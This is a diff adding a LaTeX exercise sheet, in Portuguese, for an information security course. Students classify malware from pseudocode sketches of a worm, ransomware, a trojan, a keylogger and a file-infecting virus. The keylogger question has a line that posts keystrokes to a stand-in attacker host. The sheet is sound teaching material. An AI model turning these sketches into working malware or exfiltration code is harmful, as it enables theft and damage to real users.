@@ -1,0 +1,332 @@
+\documentclass[12pt]{article}
+
+% Idioma e codificação
+\usepackage[brazil]{babel}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+
+% Matemática e listas
+\usepackage{amsmath, amssymb}
+\usepackage{enumitem}
+
+% Layout e cores
+\usepackage{geometry}
+\usepackage{graphicx}
+\usepackage{xcolor}
+\usepackage{fancyhdr}
+\usepackage[most]{tcolorbox}
+\usepackage{listings}
+
+% Cores institucionais
+\definecolor{maincolor}{RGB}{0, 79, 151}
+\definecolor{meuazul}{RGB}{0, 79, 151}
+\definecolor{meuverde}{RGB}{30, 130, 60}
+
+% Configuração de Listings para Pseudocódigo
+\lstset{
+    basicstyle=\ttfamily\footnotesize,
+    breaklines=true,
+    numbers=left,
+    numberstyle=\tiny,
+    frame=single,
+    backgroundcolor=\color{gray!5},
+    keywordstyle=\color{blue},
+    commentstyle=\color{meuverde},
+    captionpos=b
+}
+
+% Blocos
+\newtcolorbox{block}[1]{%
+  colback=blue!5,
+  colframe=maincolor,
+  coltitle=white,
+  title=#1,
+  fonttitle=\bfseries,
+  boxrule=1.5pt,
+  arc=3mm,
+  left=6pt,
+  right=6pt,
+  top=6pt,
+  bottom=6pt
+}
+
+\newtcolorbox{resposta}[1]{%
+  colback=white,
+  colframe=meuazul!30,
+  arc=1mm,
+  height=#1,
+  width=\textwidth,
+  boxrule=0.8pt
+}
+
+% Margens
+\geometry{margin=2.5cm}
+
+% Fancyhdr
+\pagestyle{fancy}
+\fancyhf{}
+
+\renewcommand{\headrulewidth}{2pt}
+\renewcommand{\footrulewidth}{2pt}
+
+\renewcommand{\headrule}{\hbox to\headwidth{%
+  \color{meuazul}\leaders\hrule height \headrulewidth\hfill}}
+
+\renewcommand{\footrule}{\hbox to\headwidth{%
+  \color{meuazul}\leaders\hrule height \footrulewidth\hfill}}
+
+\setlength{\headheight}{52pt}
+\addtolength{\topmargin}{-20pt}
+
+\fancyhead[L]{%
+  \includegraphics[height=1.2cm]{logo.png}
+}
+
+\fancyhead[R]{%
+  \raggedleft
+  \textcolor{meuazul}{%
+    \small
+    \textbf{Lista de Exercícios — Segurança da Informação I}\\
+    Me.~Sergio Souza Novak\\
+    \textit{Engenharia da Qualidade e Confiabilidade}
+  }
+}
+
+\fancyfoot[C]{\textcolor{meuazul}{\thepage}}
+
+% =========================
+\begin{document}
+% =========================
+
+\vspace*{0.2cm}
+
+\begin{center}
+  {\Large \textbf{Engenharia de Segurança da Informação (Parte 1)}}\\[0.2cm]
+  \textit{Instruções: Justifique suas respostas de forma clara e objetiva.
+  Para questões discursivas, escreva na caixa de resposta abaixo de cada enunciado.}
+\end{center}
+
+\vspace{0.4cm}
+
+\begin{block}{Conceitos de Referência}
+  \small
+  \begin{itemize}
+    \item \textbf{CIA Triad}: Confidencialidade, Integridade e Disponibilidade.
+    \item \textbf{Malware}: Softwares criados para danos, roubo de dados ou acesso não autorizado.
+    \item \textbf{Taxonomia}: Vírus e Trojans (Dependentes) vs. Worms e Bots (Independentes).
+    \item \textbf{Ataques}: Passivos (intercepção) vs. Ativos (alteração, fabricação, interrupção).
+  \end{itemize}
+\end{block}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 1 ---
+\noindent \textbf{1.} Analise o fragmento de pseudocódigo abaixo sobre um mecanismo de propagação:
+
+\begin{lstlisting}
+FUNCAO propagar()
+    alvos <- ESCANEAR_REDE_LOCAL(porta=445)
+    PARA CADA ip EM alvos:
+        SE VULNERAVEL(ip):
+            COPIAR_PARA_REMOTO(ESTE_ARQUIVO, ip + "/admin/update.exe")
+            EXECUTAR_REMOTO(ip + "/admin/update.exe")
+        FIM SE
+    FIM PARA
+FIM FUNCAO
+\end{lstlisting}
+
+Com base no comportamento de replicação automática, este malware deve ser classificado como:
+\begin{enumerate}[label=(\Alph*)]
+    \item Vírus
+    \item Worm
+    \item Trojan
+    \item Ransomware
+    \item Spyware
+\end{enumerate}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 2 ---
+\noindent \textbf{2.} Analise o fragmento abaixo que descreve uma carga útil (\textit{payload}) maliciosa:
+
+\begin{lstlisting}
+PROCEDIMENTO sequestrar_dados(chave_publica)
+    PARA CADA arquivo EM "/home/documentos":
+        SE EXTENSAO(arquivo) == ".docx" OU ".pdf":
+            conteudo <- LER(arquivo)
+            criptografado <- ENCRIPTAR_RSA(conteudo, chave_publica)
+            SOBRESCREVER(arquivo, criptografado)
+        FIM SE
+    FIM PARA
+    EXIBIR_JANELA("Seus documentos foram bloqueados. Pague para a chave.")
+FIM PROCEDIMENTO
+\end{lstlisting}
+
+Este comportamento de sequestro de dados via criptografia define um:
+\begin{enumerate}[label=(\Alph*)]
+    \item Vírus
+    \item Worm
+    \item Trojan
+    \item Ransomware
+    \item Spyware
+\end{enumerate}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 3 ---
+\noindent \textbf{3.} Observe a estrutura do programa abaixo:
+
+\begin{lstlisting}
+PROGRAMA "Calculadora_Gratis.exe"
+    INICIO:
+        INICIAR_THREAD(FUNCAO_OCULTA_COLETAR_SENHAS)
+        ABRIR_INTERFACE_CALCULADORA()
+    FIM INICIO
+FIM PROGRAMA
+\end{lstlisting}
+
+O uso de um programa legítimo para camuflar uma função maliciosa é característica de um:
+\begin{enumerate}[label=(\Alph*)]
+    \item Vírus
+    \item Worm
+    \item Trojan
+    \item Ransomware
+    \item Spyware
+\end{enumerate}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 4 ---
+\noindent \textbf{4.} Analise a rotina de monitoramento descrita abaixo:
+
+\begin{lstlisting}
+LOOP_INFINITO:
+    teclas <- CAPTURAR_PRESSOES_TECLADO()
+    SE TAMANHO(teclas) > 100 caracteres:
+        DUMP <- COMPACTAR(teclas)
+        POST_HTTP("http://servidor-atacker.xyz/logs", DUMP)
+    FIM SE
+    AGUARDAR(5 segundos)
+FIM LOOP
+\end{lstlisting}
+
+Este malware, focado em monitorar e coletar dados silenciosamente, é um:
+\begin{enumerate}[label=(\Alph*)]
+    \item Vírus
+    \item Worm
+    \item Trojan
+    \item Ransomware
+    \item Spyware
+\end{enumerate}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 5 ---
+\noindent \textbf{5.} Analise a função de infecção local:
+
+\begin{lstlisting}
+FUNCAO infectar_sistema()
+    lista_exes <- LISTAR_ARQUIVOS_DIRETORIO_ATUAL("*.exe")
+    PARA CADA exe EM lista_exes:
+        SE NAO_ESTA_INFECTADO(exe):
+            MEU_CODIGO <- LER_BYTES(ESTE_ARQUIVO, inicio=0, fim=1024)
+            INSERIR_NO_INICIO(exe, MEU_CODIGO)
+        FIM SE
+    FIM PARA
+FIM FUNCAO
+\end{lstlisting}
+
+Ao necessitar anexar-se a arquivos hospedeiros legítimos para sua propagação, classificamos como:
+\begin{enumerate}[label=(\Alph*)]
+    \item Vírus
+    \item Worm
+    \item Trojan
+    \item Ransomware
+    \item Spyware
+\end{enumerate}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 6 ---
+\noindent \textbf{6.} Explique a mudança de paradigma na engenharia de software ocorrida na década de 1990 em relação à década de 1980. Por que a conectividade global tornou a segurança um requisito fundamental e não mais um "recurso extra"?
+\begin{resposta}{4cm}
+\end{resposta}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 7 ---
+\noindent \textbf{7.} Sobre a \textbf{Tríade CIA}:
+\begin{enumerate}[label=\alph*)]
+    \item Defina os três pilares (Confidencialidade, Integridade e Disponibilidade).
+    \item Explique o "Efeito Cascata" citando um exemplo onde a perda de integridade leva à indisponibilidade do sistema.
+\end{enumerate}
+\begin{resposta}{5cm}
+\end{resposta}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 8 ---
+\noindent \textbf{8.} Na "Pilha de Infraestrutura", atacantes frequentemente focam em navegadores (browsers) e sistemas operacionais em vez de aplicações específicas de baixo volume. Qual a lógica estratégica por trás dessa escolha?
+\begin{resposta}{4cm}
+\end{resposta}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 9 ---
+\noindent \textbf{9.} A segurança operacional lida com o "Fator Humano". Explique por que a tensão entre \textbf{segurança rigorosa} e \textbf{eficácia no trabalho} frequentemente leva à violação de políticas de segurança pelos usuários.
+\begin{resposta}{4.5cm}
+\end{resposta}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 10 ---
+\noindent \textbf{10.} Diferencie os conceitos de \textbf{Exposição} e \textbf{Vulnerabilidade} no contexto de engenharia de segurança da informação.
+\begin{resposta}{3.5cm}
+\end{resposta}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 11 ---
+\noindent \textbf{11.} Analise o "Problema do Post-it" estudado em sala. Por que esse comportamento do usuário (colar a senha no monitor) deve ser interpretado como uma falha de projeto do sistema e não apenas como um erro humano?
+\begin{resposta}{4.5cm}
+\end{resposta}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 12 ---
+\noindent \textbf{12.} Associe o tipo de ameaça ao impacto no sistema (ex: CIA):
+\begin{itemize}
+    \item (A) Interceptação \quad (\quad) Injeção de transações bancárias falsas. (Fabricação)
+    \item (B) Interrupção \quad (\quad) Leitura não autorizada de prontuários. (Interceptação)
+    \item (C) Alteração \quad (\quad) Sobrecarga de servidor via ataque DoS. (Interrupção)
+    \item (D) Fabricação \quad (\quad) Modificação da dosagem de um medicamento no banco de dados. (Alteração)
+\end{itemize}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 13 ---
+\noindent \textbf{13.} No estudo de caso do sistema \textbf{Mentcare}, quais seriam as consequências catastróficas de uma ameaça de \textbf{Interrupção} durante um atendimento de emergência psiquiátrica?
+\begin{resposta}{4.5cm}
+\end{resposta}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 14 ---
+\noindent \textbf{14.} Explique por que o ataque de \textbf{Fabricação} (como o injeção de transações falsas estudada no CS5) ataca tanto a Integridade quanto a Autenticidade de um sistema financeiro.
+\begin{resposta}{4.5cm}
+\end{resposta}
+
+\vspace{0.5cm}
+
+% --- QUESTÃO 15 ---
+\noindent \textbf{15.} Defina \textbf{Resiliência} de sistemas e explique os dois componentes do seu ciclo: Resistência e Recuperação. Por que um sistema puramente "resistente" ainda pode ser vulnerável?
+\begin{resposta}{5cm}
+\end{resposta}
+
+\vspace{0.8cm}
+
+\begin{center}
+  \textit{``Boa atividade! Att. Me. Prof. Sergio Souza Novak.''}
+\end{center}
+
+\end{document}
